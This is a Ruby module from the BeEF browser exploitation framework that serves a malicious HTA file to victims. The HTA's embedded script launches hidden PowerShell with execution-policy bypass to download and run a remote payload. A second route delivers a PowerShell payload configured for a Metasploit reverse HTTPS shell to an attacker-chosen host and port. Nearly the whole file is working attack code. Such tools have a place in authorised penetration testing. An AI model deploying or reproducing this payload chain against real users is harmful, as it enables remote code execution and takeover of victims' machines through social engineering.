#
# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Hta_powershell < BeEF::Core::Command

  class Bind_hta < BeEF::Core::Router::Router
    before do
      headers 'Pragma' => 'no-cache',
              'Cache-Control' => 'no-cache',
              'Expires' => '0'
    end

    get '/' do
      response['Content-Type'] = "application/hta"
      hta_handler = settings.domain + settings.hta_mount_point
      payload_handler = settings.domain + settings.hta_mount_point + settings.ps_mount_point
      print_info "Serving HTA from [#{hta_handler}] and PowerShell payload from [#{payload_handler}]"
      "<script>
          var c = \"cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('#{payload_handler}')); Invoke-ps\\\"\\\"\";
          new ActiveXObject('WScript.Shell').Run(c);
      </script>"
    end

    get '/ps' do
      response['Content-Type'] = "text/plain"
      ps_lhost = settings.ps_lhost.to_s
      ps_port = settings.ps_port.to_s

      ps_payload_path = "#{$root_dir}/modules/social_engineering/hta_powershell/powershell_payload"

      ps_payload = ''
      if File.exist?(ps_payload_path)
        ps_payload = File.read(ps_payload_path).gsub("___LHOST___", ps_lhost).gsub("___LPORT___", ps_port)
      end
      ps_payload
    end
  end

  def pre_send

    # gets the value configured in the module configuration by the user
    @datastore.each do |input|
      if input['name'] == "domain"
        @domain = input['value']
      end
      if input['name'] == "hta_mount_point"
        @hta_mount_point = input['value']
      end
      if input['name'] == "ps_mount_point"
        @ps_mount_point = input['value']
      end
      if input['name'] == "ps_lhost"
        @ps_lhost = input['value']
      end
      if input['name'] == "ps_port"
        @ps_port = input['value']
      end
    end

    # mount the extension in the BeEF web server, calling a specific nested class (needed because we need a specifi content-type/disposition)
    bind_hta = Hta_powershell::Bind_hta
    bind_hta.set :domain, @domain
    bind_hta.set :ps_mount_point, @ps_mount_point
    bind_hta.set :hta_mount_point, @hta_mount_point
    bind_hta.set :ps_lhost, @ps_lhost
    bind_hta.set :ps_port, @ps_port
    BeEF::Core::Server.instance.mount(@hta_mount_point, bind_hta.new)
    BeEF::Core::Server.instance.remap
  end

	def self.options
		return [
        {'name' => 'domain', 'ui_label' => 'Serving Domain (for both HTA and PS payload)', 'value' => 'http://beef_domain.com'},
        {'name' => 'hta_mount_point', 'ui_label' => 'HTA Mount point', 'value' => '/hta'},
        {'name' => 'ps_mount_point', 'ui_label' => 'PowerShell Payload Mount point', 'value' => '/ps'},
        {'name' => 'ps_lhost', 'ui_label' => 'MSF Reverse HTTPS LHOST', 'value' => '10.10.10.10'},
        {'name' => 'ps_port', 'ui_label' => 'MSF Reverse HTTPS LPORT', 'value' => '443'}
    ]
	end

	def post_execute
		save({'result' => @datastore['result']})
	end

end
